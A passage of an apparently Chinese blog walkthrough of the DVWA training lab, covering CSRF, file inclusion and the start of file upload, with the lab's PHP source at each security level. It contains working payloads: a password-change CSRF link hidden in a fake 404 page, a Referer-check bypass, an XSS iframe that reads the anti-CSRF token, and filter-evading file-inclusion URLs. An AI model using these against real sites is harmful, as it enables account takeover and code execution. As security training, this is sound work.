<p><img src="https://img-blog.csdnimg.cn/959b54694c5342ba9666302d7a9b60b5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 构造恶意连接：</p>
<p><a href="http://123.56.82.231:9000/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change">http://123.56.82.231:9000/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</a></p>
<p>浏览器中访问 连接</p>
<p>登录时发现原密码登录失败，使用123456才可成功登录</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>只要诱骗用户点击这个恶意链接，就会将在不知情的情况下将密码改为123456</p>
<p><strong>我们使用Burpsuite中的PoC检测CSRF</strong></p>
<p>使用 PoC</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051286.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 在浏览器中测试，Burpsuite会自动创建一个站点,复制 URL</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051282.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>在浏览器中访问 URL </p>
<p>若要在浏览器中显示此响应，请复制下面的URL并粘贴到配置为使用Burp作为其代理的浏览器中。</p>
<p> 关闭代理，点击按钮</p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051418.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>提示密码已经修改</p>
<p><img src="https://img-blog.csdnimg.cn/bd3fff8a5de34d9abe98975a3abf710b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们退出再登录账号，密码使用123456，登录成功。</p>
<p><strong>这说明存在CSRF</strong></p>
<p>回到我们构造的恶意链接</p>
<p><a href="http://123.56.82.231:9000/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change">http://123.56.82.231:9000/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</a></p>
<p>我们可以伪装恶意代码</p>
<p>我们将phpstudy 中 index.html改为index1.html</p>
<p>我们将构造的恶意链接伪装，放入index.html中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://123.56.82.231:9000/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt; </span><br><span class="line">&lt;h2&gt;resource not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/b17fadc24405464bacd88543d2e5ffd6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>重启phpstudy服务，访问IP(这里是我本机上的phpstudy，127.0.0.1)</p>
<p>放到那台服务器或者电脑上，则去访问对应的IP</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051354.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 成功的访问到了404， 这说明密码已经修改了</p>
<p>经过测试密码确实已经修改了，大家可以测试一下。</p>
<h2 id="Security-level-is-currently-medium-2"><a href="#Security-level-is-currently-medium-2" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p> 分析源码：</p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.31.155），希望通过这种机制抵御CSRF攻击。</p>
<p>漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是123.56.82.231）我们可以将攻击页面命名为123.56.82.231.php（页面被放置在攻击者的服务器里，这里是127.0.0.1）就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ], <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>准备php文件，把密码修改成 936826</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051699.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 重启phpstudy，访问 127.0.0.1/123.82.56.231.php抓包</p>
<p>我们在 Referer: 后面加上我们的 123..56.82.231.php文件名，或者直接将127.0.0.1改成123.56.82.231</p>
<p>这样的话Referer中就包含了我们的Host 123.56.82.231， 这样就可以绕过了</p>
<p>我们抓到的包如图所示，如果不是这样的Forward</p>
<p>修改完成后，Forward </p>
<p><img src="https://img-blog.csdnimg.cn/720aa934565e4e7da32b58895e60d7fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 测试密码修改成功。</p>
<h2 id="Security-level-is-currently-high-2"><a href="#Security-level-is-currently-high-2" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Medium和High的对比</p>
<p>客户端访问攻击页面-&gt;攻击页面将密码作为参数直接提交到修改密码页面</p>
<p>客户端访问攻击页面-&gt;攻击页面获取修改密码页面的token-&gt;将token和密码作为参数一起提交</p>
<p>问题在这一步上</p>
<p>攻击页面获取修改密码页面的token</p>
<p>这一步属于跨域请求，浏览器已经禁止这么做了，所以想要完整这个操作，有两个思路：</p>
<p>第一， 将该js上传到服务器的目录下，这样就是同一个域了，不过如果可以这样，为啥不放木马呢？</p>
<p>第二， 利用xss，xss可以执行代码，获取token</p>
<p>xss更现实一点，但是也得需要该网站存在xss，所以单纯从这个修改密码页面，无法突破High漏洞</p>
<p>这里演示xss窃取token</p>
<p>我们利用XSS（Reflected） 漏洞执行我们的代码，这里的src 就是我们CSRF的URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://123.56.82.231:9000/vulnerabilities/csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/c97f9d15d3df4c96878b8aec219ec954.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>弹出的窗口内容，就是我们获取到的token<br> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051367.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">​</p>
<h2 id="Security-level-is-currently-impossible-2"><a href="#Security-level-is-currently-impossible-2" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>这里让输入原密码，不清楚原密码的情况下，就无法进行CSRF攻击。</p>
<p>结合业务设计，修改密码必须提供原密码，保障安全。</p>
<h1 id="Vulnerability-File-Inclusion（文件包含）"><a href="#Vulnerability-File-Inclusion（文件包含）" class="headerlink" title="Vulnerability: File Inclusion（文件包含）"></a>Vulnerability: File Inclusion（文件包含）</h1><h2 id="Security-level-is-currently-low-3"><a href="#Security-level-is-currently-low-3" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p> 分析源码：</p>
<p>直接获取了page参数，没有任何过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>尝试点击,发现page的值就是文件名</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051349.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行</strong>，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，<strong>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></p>
<p>本地文件包含：</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 将本地文件路径传给page<img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051678.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 远程文件包含：</p>
<p><img src="https://img-blog.csdnimg.cn/80ca51cdc9754505ba2f63d539881c73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们找到对应的php版本修改php.ini ,将<em>allow_url_include修改为On</em></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051278.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们构造URL ，为了隐蔽性也可以对URL进行编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051275.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 执行成功<img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051177.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-3"><a href="#Security-level-is-currently-medium-3" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<p>将 “http://“ ,”https://“ ,”../“ ,”..&quot;“ 替换成空，我们直接双写绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051351.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-3"><a href="#Security-level-is-currently-high-3" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<p>如果page 中不包含 file 并且 file 不等于 include.php，则 输出 File not found !</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>通过file协议实现本地文件包含：</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051794.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-3"><a href="#Security-level-is-currently-impossible-3" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>分析源码：</p>
<p>Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Vulnerability-File-Upload"><a href="#Vulnerability-File-Upload" class="headerlink" title="Vulnerability: File Upload"></a>Vulnerability: File Upload</h1><p>文件上传就不再做了</p>
<p>不会的同学可以参考我写的文件上传的其他博客</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121153254?spm=1001.2014.3001.5501">upload-labs通关详解</a></p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121335076">CTFHub技能树 Web-文件上传 详解</a></p>
<p>这里分析一下 Impossible级别的代码，对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a 